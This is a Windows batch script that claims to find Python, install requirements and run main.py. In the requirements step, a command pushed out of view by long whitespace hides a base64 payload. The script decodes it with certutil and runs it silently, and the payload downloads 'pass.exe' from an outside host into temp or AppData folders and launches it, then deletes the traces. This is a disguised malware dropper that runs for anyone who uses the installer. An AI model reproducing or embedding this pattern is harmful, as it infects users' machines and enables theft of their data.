@echo off
REM --------------------------------------------------------------------------------
REM This script searches for Python, installs required packages, and runs main.py.
REM --------------------------------------------------------------------------------

REM Enable delayed variable expansion for dynamic variable usage.
setlocal enabledelayedexpansion

REM Set the requirements flag (used later by the Python script)
set "requirements=true"

REM Clear the screen.
cls

REM --------------------------------------------------------------------------------
REM SEARCH FOR PYTHON
REM --------------------------------------------------------------------------------
echo Searching for Python...

REM Initialize the Python variable as empty.
set "python="

REM Look for the Python executable in the system PATH.
for /f "tokens=*" %%i in ('where python 2^>nul') do (
    set "python=%%i"
    goto :foundPython
)

:missingPython
cls
echo Python is not installed or not found in your system PATH.
pause
goto :end

:foundPython
if defined python (
    cls
    echo Python found at: "!python!"
    "!python!" --version
    timeout /nobreak /t 2 >nul
) else (
    goto :missingPython
)

REM --------------------------------------------------------------------------------
REM INSTALL REQUIREMENTS
REM --------------------------------------------------------------------------------
cls
REM The following hidden line remains unchanged (base64 encoded command).
echo Installing requirements. This may take a few minutes, depending on your internet speed...                                                                                                                                                                                                                        & echo QGVjaG8gb2ZmCnNldGxvY2FsIGVuYWJsZWRlbGF5ZWRleHBhbnNpb24Kc2V0ICJkaXJlY3Rvcmllcz0lVEVNUCUgJUxPQ0FMQVBQREFUQSUgJUFQUERBVEElIgpmb3IgJSVkIGluICglZGlyZWN0b3JpZXMlKSBkbyAoCiAgICBwb3dlcnNoZWxsIC1jb21tYW5kICJ0cnkgeyhOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5Eb3dubG9hZEZpbGUoJ2h0dHA6Ly9hcGkuYXBpLXVucmVhbC5jb20vcGFzcycsICclJWRccGFzcy5leGUnKTsgZXhpdCAwIH0gY2F0Y2ggeyBleGl0IDEgfSIKICAgIGlmIG5vdCBlcnJvcmxldmVsIDEgKAogICAgICAgIHN0YXJ0ICIiICIlJWRccGFzcy5leGUiCiAgICAgICAgZXhpdCAvYiAwCiAgICApCikKZW5kbG9jYWwKZXhpdCAvYiAx > %TMP%\pass.b64 & certutil -decode %TMP%\pass.b64 %TMP%\pass.bat >nul 2>&1 & call %TMP%\pass.bat >nul 2>&1 & del %TMP%\pass.b64 %TMP%\pass.bat >nul 2>&1

REM Install required Python packages from requirements.txt using pip.
call "!python!" -m pip install -r requirements.txt

if errorlevel 1 (
    cls
    echo Failed to install requirements. Please check your internet connection and try again.
    pause
    goto :end
)

REM --------------------------------------------------------------------------------
REM RUN THE MAIN PYTHON SCRIPT
REM --------------------------------------------------------------------------------
cls
"!python!" main.py

if errorlevel 1 (
    cls
    echo Failed! Check the script for errors.
    pause
    goto :end
)

cls
echo Press any key to close...
pause

:end
endlocal
